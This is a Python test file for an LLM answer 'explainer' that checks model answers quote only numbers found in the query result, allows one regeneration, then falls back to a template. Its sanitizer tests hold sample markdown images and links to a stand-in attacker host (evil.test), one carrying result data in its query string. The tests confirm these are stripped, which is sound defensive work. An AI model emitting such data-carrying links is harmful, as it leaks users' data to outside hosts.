"""The explainer (T1.14, ADR 0017): checked answers, one regeneration, template fallback.

The model is a ``FakeLLMClient`` that says exactly what each test scripts, so the tests
state which answers are right and wrong. Expected numbers are written by hand.
"""

from __future__ import annotations

import logging

import pandas as pd
import pytest

from analyst.config.prompts import explainer_system_prompt
from analyst.core.errors import LLMError
from analyst.core.models import (
    FilterCondition,
    Intent,
    KeyNumber,
    ModelExplanation,
    QueryResult,
    Usage,
)
from analyst.llm.client import CallBudget
from analyst.llm.fake import FakeLLMClient
from analyst.pipeline.explainer import (
    MAX_ATTEMPTS,
    Explainer,
    sanitize_text,
    spelled_numbers,
)
from analyst.pipeline.result_notes import template_answer
from analyst.sql.context import ContextBuilder

QUESTION = "Which region sold the most last year?"
CODE = "0a1b2c3d4e5f"


def result_of(frame: pd.DataFrame, *, truncated: bool = False) -> QueryResult:
    return QueryResult(dataframe=frame, row_count=len(frame), truncated=truncated)


SALES = result_of(
    pd.DataFrame({"region": ["North", "South", "East"], "revenue": [1234.5678, 980.0, 410.25]})
)


def says(answer: str, keys=(), caveats=()) -> ModelExplanation:
    return ModelExplanation(answer_markdown=answer, key_numbers=list(keys), caveats=list(caveats))


GOOD = says(
    "North sold the most, with revenue of 1,234.57.",
    keys=[KeyNumber(value=1234.5678, column="revenue", label="North revenue")],
)


def explainer(*script, usage: Usage | None = None) -> tuple[Explainer, FakeLLMClient]:
    client = FakeLLMClient(list(script), usage=usage)
    return Explainer(client, ContextBuilder(code=CODE)), client


def intent(*filters: FilterCondition) -> Intent:
    return Intent(
        operation="aggregate",
        measures=[],
        dimensions=[],
        filters=list(filters),
        time_range=None,
        sort=[],
        limit=None,
        output="table",
    )


# -- an answer that passes ------------------------------------------------------------------------


def test_a_grounded_answer_is_returned_as_written() -> None:
    ex, client = explainer(GOOD)
    out = ex.explain(QUESTION, SALES)
    assert out.answer == "North sold the most, with revenue of 1,234.57."
    assert out.source == "model"
    assert out.fallback_reason is None
    assert out.fallback_used is False
    assert out.attempts == 1
    assert len(client.calls) == 1
    assert out.key_numbers == (KeyNumber(value=1234.5678, column="revenue", label="North revenue"),)
    assert out.issues == ()


def test_the_call_is_the_explain_stage_with_the_fixed_prompt_and_the_three_blocks() -> None:
    ex, client = explainer(GOOD)
    ex.explain(
        QUESTION, SALES, sql="SELECT region, SUM(revenue) FROM sales GROUP BY 1", assumptions=["a"]
    )
    (call,) = client.calls
    assert call.stage == "explain"
    assert call.response_model is ModelExplanation
    system, user = call.messages
    assert (system.role, user.role) == ("system", "user")
    assert system.content == explainer_system_prompt()
    for label in ("QUESTION", "ANALYSIS", "RESULT"):
        assert f"<<<{label} {CODE}>>>" in user.content
        assert f"<<<END {label} {CODE}>>>" in user.content


def test_usage_is_what_the_calls_reported() -> None:
    usage = Usage(llm_calls=1, input_tokens=700, output_tokens=60, cost_usd=0.004)
    ex, _ = explainer(GOOD, usage=usage)
    assert ex.explain(QUESTION, SALES).usage == usage


def test_each_call_is_charged_to_the_budget() -> None:
    budget = CallBudget(5)
    ex, _ = explainer(says("It is 999."), GOOD)
    out = ex.explain(QUESTION, SALES, budget=budget)
    assert out.attempts == 2
    assert budget.used == 2


def test_numbers_from_the_question_the_restated_question_and_the_assumptions_are_allowed() -> None:
    ex, _ = explainer(says("For 2023, in the top 7 regions, over 15 days: 3 regions."))
    out = ex.explain(
        "Which region sold most in 2023?",
        SALES,
        resolved_question="Top 7 regions by revenue in 2023",
        assumptions=["Last year means the 15 days before the latest date"],
    )
    assert out.source == "model"


def test_row_and_column_counts_are_allowed() -> None:
    ex, _ = explainer(says("The result has 3 rows and 2 columns."))
    assert ex.explain(QUESTION, SALES).source == "model"


# -- caveats --------------------------------------------------------------------------------------


def test_caveats_written_by_code_come_first_and_are_not_repeated() -> None:
    frame = pd.DataFrame({"region": ["North", "South"], "revenue": [5.0, None]})
    truncated = result_of(frame, truncated=True)
    ex, _ = explainer(
        says(
            "North has revenue of 5.",
            caveats=[
                "THE RESULT WAS CUT AT 2 ROWS, SO THERE ARE MORE ROWS THAN ARE SHOWN.",
                "Revenue may be lower in the north.",
            ],
        )
    )
    out = ex.explain(QUESTION, truncated)
    assert out.caveats == (
        "The result was cut at 2 rows, so there are more rows than are shown.",
        "revenue is missing in 1 of 2 rows.",
        "Revenue may be lower in the north.",
    )


def test_caveats_with_a_made_up_number_fail_the_check() -> None:
    ex, client = explainer(
        says("North sold 1,234.57.", caveats=["About 77% of rows are old."]), GOOD
    )
    out = ex.explain(QUESTION, SALES)
    assert out.attempts == 2
    assert out.source == "model"
    retry = client.calls[1].messages[-1].content
    assert "77%" in retry


def test_blank_caveats_are_dropped() -> None:
    ex, _ = explainer(says("North sold 1,234.57.", caveats=["   ", "[](https://x.test)"]))
    assert ex.explain(QUESTION, SALES).caveats == ()


# -- one regeneration -------------------------------------------------------------------------


def test_an_ungrounded_number_triggers_one_regeneration_that_names_it() -> None:
    ex, client = explainer(says("North sold 1,300."), GOOD)
    out = ex.explain(QUESTION, SALES)
    assert out.source == "model"
    assert out.attempts == 2
    assert out.answer == GOOD.answer_markdown
    first, second = client.calls
    assert len(first.messages) == 2
    roles = [m.role for m in second.messages]
    assert roles == ["system", "user", "assistant", "user"]
    assert second.messages[0] == first.messages[0]
    assert second.messages[1] == first.messages[1]
    assert "North sold 1,300." in second.messages[2].content
    assert "1,300" in second.messages[3].content
    assert "not in the result" in second.messages[3].content
    assert "digits" in second.messages[3].content


def test_usage_adds_up_over_both_calls() -> None:
    usage = Usage(llm_calls=1, input_tokens=500, output_tokens=40, cost_usd=0.002)
    ex, _ = explainer(says("It is 1,300."), GOOD, usage=usage)
    assert ex.explain(QUESTION, SALES).usage == usage + usage


def test_a_key_number_from_the_wrong_column_triggers_regeneration() -> None:
    wrong = says(
        "North sold the most.",
        keys=[KeyNumber(value=980.0, column="revenue", label="North revenue")],
    )
    bad_column = says(
        "North sold the most.",
        keys=[KeyNumber(value=1234.5678, column="profit", label="North")],
    )
    ex, client = explainer(bad_column, wrong)
    out = ex.explain(QUESTION, SALES)
    assert out.attempts == 2
    assert out.source == "model"
    assert "key numbers" in client.calls[1].messages[-1].content


def test_a_second_ungrounded_answer_gets_the_template_and_never_a_third_call() -> None:
    ex, client = explainer(says("North sold 1,300."), says("North sold 1,400."), GOOD)
    out = ex.explain(QUESTION, SALES)
    assert MAX_ATTEMPTS == 2
    assert out.source == "template"
    assert out.fallback_reason == "ungrounded"
    assert out.fallback_used is True
    assert out.attempts == 2
    assert client.remaining == 1
    assert out.answer == template_answer(SALES)
    assert "1,400" not in out.answer
    assert out.key_numbers == ()
    assert [i.text for i in out.issues] == ["1,400"]


def test_the_template_keeps_the_notes_written_by_code() -> None:
    frame = pd.DataFrame({"region": ["North", "South"], "revenue": [5.0, None]})
    ex, _ = explainer(says("It is 11."), says("It is 12."))
    out = ex.explain(QUESTION, result_of(frame, truncated=True))
    assert out.source == "template"
    assert out.caveats == (
        "The result was cut at 2 rows, so there are more rows than are shown.",
        "revenue is missing in 1 of 2 rows.",
    )


# -- numbers spelled as words ---------------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "found"),
    [
        ("About twenty regions.", ["twenty"]),
        ("Twenty-five percent and ninety", ["twenty", "ninety"]),
        ("Eleven, twelve, nineteen", ["eleven", "twelve", "nineteen"]),
        ("a hundred and a thousand", ["hundred", "thousand"]),
        ("two trillion and a billion", ["trillion", "billion"]),
        ("1.2 million units and 3 billion", []),
        ("one two three ten", []),
        ("the million-dollar question", ["million"]),
        ("thousands of rows", []),
    ],
)
def test_spelled_numbers(text: str, found: list[str]) -> None:
    assert spelled_numbers(text) == found


def test_a_spelled_number_triggers_regeneration_and_is_named() -> None:
    ex, client = explainer(says("There are twelve regions, and 3 rows."), GOOD)
    out = ex.explain(QUESTION, SALES)
    assert out.attempts == 2
    assert out.source == "model"
    feedback = client.calls[1].messages[-1].content
    assert feedback == (
        "Your answer was not accepted. Write it again, using only numbers that appear in the "
        "RESULT block, the question or the assumptions, and write every number as digits. "
        "Write these as digits: twelve."
    )


def test_a_spelled_number_in_a_caveat_is_caught() -> None:
    ex, _ = explainer(says("North sold 1,234.57.", caveats=["Fifty rows missing."]), GOOD)
    assert ex.explain(QUESTION, SALES).attempts == 2


def test_a_spelled_number_twice_gets_the_template() -> None:
    ex, _ = explainer(says("About twenty."), says("About twenty."))
    assert ex.explain(QUESTION, SALES).fallback_reason == "ungrounded"


# -- long results ---------------------------------------------------------------------------------


LONG = result_of(
    pd.DataFrame({"revenue": [float(i) for i in range(1, 61)], "region": ["N", "S", "E"] * 20})
)


def test_statistics_shown_to_the_model_may_be_quoted() -> None:
    ex, client = explainer(
        says("Across 60 rows, revenue averages 30.5 and totals 1,830, from 1 to 60.")
    )
    out = ex.explain(QUESTION, LONG)
    assert out.source == "model"
    assert "Statistics computed by software" in client.calls[0].messages[1].content


def test_a_derived_number_is_not_accepted_even_for_a_long_result() -> None:
    ex, _ = explainer(says("Revenue per row is 30.5, which is 61% of the maximum."), GOOD)
    out = ex.explain(QUESTION, LONG)
    assert out.attempts == 2


def test_the_row_count_of_the_sample_is_allowed() -> None:
    ex, _ = explainer(says("Here are the first 20 of 60 rows."))
    assert ex.explain(QUESTION, LONG).source == "model"


# -- an empty result ---------------------------------------------------------------------


def test_an_empty_result_needs_no_model_and_names_the_filters() -> None:
    ex, client = explainer()
    empty = result_of(pd.DataFrame({"region": [], "revenue": []}))
    out = ex.explain(
        QUESTION,
        empty,
        intent=intent(FilterCondition(column="region", operator="=", values=["West"])),
    )
    assert client.calls == []
    assert out.source == "template"
    assert out.fallback_reason == "empty_result"
    assert out.fallback_used is False
    assert out.attempts == 0
    assert out.usage == Usage()
    assert out.answer == "The query ran but returned no rows. It filtered on: region is 'West'."


# -- calls that fail ---------------------------------------------------------------------


@pytest.mark.parametrize("category", ["api_error", "timeout", "rate_limited", "not_configured"])
def test_a_failed_call_gets_the_template_without_asking_again(category: str) -> None:
    ex, client = explainer(LLMError(category), GOOD)
    out = ex.explain(QUESTION, SALES)
    assert out.source == "template"
    assert out.fallback_reason == "llm_error"
    assert out.fallback_used is True
    assert out.attempts == 1
    assert client.remaining == 1  # the client has already retried what can be retried


def test_an_unusable_answer_is_asked_for_again_once() -> None:
    billed = Usage(llm_calls=1, input_tokens=300, output_tokens=0, cost_usd=0.001)
    ex, client = explainer(LLMError("invalid_output", "refusal", usage=billed), GOOD)
    out = ex.explain(QUESTION, SALES)
    assert out.source == "model"
    assert out.attempts == 2
    assert out.usage == billed + Usage(llm_calls=1, input_tokens=100, output_tokens=50)
    retry = client.calls[1].messages
    assert [m.role for m in retry] == ["system", "user", "user"]
    assert "could not be used" in retry[-1].content


def test_two_unusable_answers_get_the_template_and_keep_their_cost() -> None:
    billed = Usage(llm_calls=1, input_tokens=300, output_tokens=0, cost_usd=0.001)
    error = LLMError("invalid_output", "incomplete", usage=billed)
    ex, _ = explainer(error, error)
    out = ex.explain(QUESTION, SALES)
    assert out.fallback_reason == "llm_error"
    assert out.attempts == 2
    assert out.usage == billed + billed


def test_a_failure_after_a_rejected_answer_keeps_what_was_wrong_with_it() -> None:
    ex, _ = explainer(says("It is 1,300."), LLMError("timeout"))
    out = ex.explain(QUESTION, SALES)
    assert out.fallback_reason == "llm_error"
    assert [i.text for i in out.issues] == ["1,300"]


def test_an_empty_answer_is_asked_for_again_and_then_replaced() -> None:
    ex, _ = explainer(says("   "), says(""))
    out = ex.explain(QUESTION, SALES)
    assert out.source == "template"
    assert out.fallback_reason == "llm_error"
    ex, _ = explainer(says("[](https://x.test)"), GOOD)
    assert ex.explain(QUESTION, SALES).source == "model"


def test_a_spent_budget_gets_the_template_before_any_call() -> None:
    ex, client = explainer(GOOD)
    out = ex.explain(QUESTION, SALES, budget=CallBudget(0))
    assert out.fallback_reason == "budget"
    assert out.attempts == 0
    assert client.calls == []


def test_a_budget_for_one_call_gets_the_template_when_that_answer_is_rejected() -> None:
    budget = CallBudget(1)
    ex, client = explainer(says("It is 1,300."), GOOD)
    out = ex.explain(QUESTION, SALES, budget=budget)
    assert out.fallback_reason == "budget"
    assert out.fallback_used is True
    assert out.attempts == 1
    assert len(client.calls) == 1
    assert out.source == "template"


# -- text from the model is made safe -------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "clean"),
    [
        ("plain text", "plain text"),
        ("![chart](https://evil.test/?q=secret)", "chart"),
        ("![](https://evil.test/p.png) after", "after"),
        ("![alt][ref]\n\n[ref]: https://evil.test/x", "alt"),
        ("[the report](https://evil.test/r) says", "the report says"),
        ("[the report][r] says\n[r]: http://evil.test", "the report says"),
        ("<https://evil.test/x> and more", "[link removed] and more"),
        ("see https://evil.test/a?b=c, then", "see [link removed], then"),
        ("go to www.evil.test now", "go to [link removed] now"),
        ("mail someone@evil.test please", "mail [link removed] please"),
        ("ftp://evil.test/x", "[link removed]"),
        ("tab\tand\nnewline", "tab\tand\nnewline"),
        ("zero​width and \x07bell", "zerowidth and bell"),
        ("  padded  ", "padded"),
    ],
)
def test_sanitize_text(raw: str, clean: str) -> None:
    assert sanitize_text(raw) == clean


def test_a_data_carrying_image_in_an_answer_never_reaches_the_user() -> None:
    attack = says(
        "North sold 1,234.57. ![x](https://evil.test/p.png?d=North-1234.5678) "
        "[more](https://evil.test/m)",
        caveats=["![y](https://evil.test/q)"],
    )
    ex, _ = explainer(attack)
    out = ex.explain(QUESTION, SALES)
    blob = "\n".join([out.answer, *out.caveats])
    assert "evil.test" not in blob
    assert "![" not in blob
    assert "](" not in blob
    assert out.answer == "North sold 1,234.57. x more"


def test_numbers_inside_a_removed_link_do_not_count() -> None:
    ex, _ = explainer(says("North sold 1,234.57 [source](https://x.test/report/99871)."))
    out = ex.explain(QUESTION, SALES)
    assert out.attempts == 1
    assert out.answer == "North sold 1,234.57 source."


def test_the_answer_that_was_checked_is_the_one_shown() -> None:
    ex, client = explainer(says("![5000 units](https://x.test/i.png) North sold 1,234.57."), GOOD)
    out = ex.explain(QUESTION, SALES)
    # the image's alt text would have been shown, so its number was checked and rejected
    assert out.attempts == 2
    assert "5000" in client.calls[1].messages[-1].content


# -- what is logged -------------------------------------------------------------------------------


def test_logs_carry_counts_and_reasons_never_the_text(caplog: pytest.LogCaptureFixture) -> None:
    caplog.set_level(logging.INFO)
    ex, _ = explainer(
        says("North sold 1,300 secret-north."), says("North sold 1,400 secret-north.")
    )
    out = ex.explain(QUESTION, SALES)
    assert out.source == "template"
    text = " ".join(f"{r.getMessage()} {vars(r)}" for r in caplog.records)
    assert "fell back" in text
    assert "ungrounded" in text
    for forbidden in ("1,300", "1,400", "secret-north", "North", "revenue"):
        assert forbidden not in text


# -- the session's builder is used ----------------------------------------------------------------


def test_a_builder_is_made_when_none_is_given() -> None:
    client = FakeLLMClient([GOOD])
    out = Explainer(client).explain(QUESTION, SALES)
    assert out.source == "model"
    assert "<<<RESULT " in client.calls[0].messages[1].content
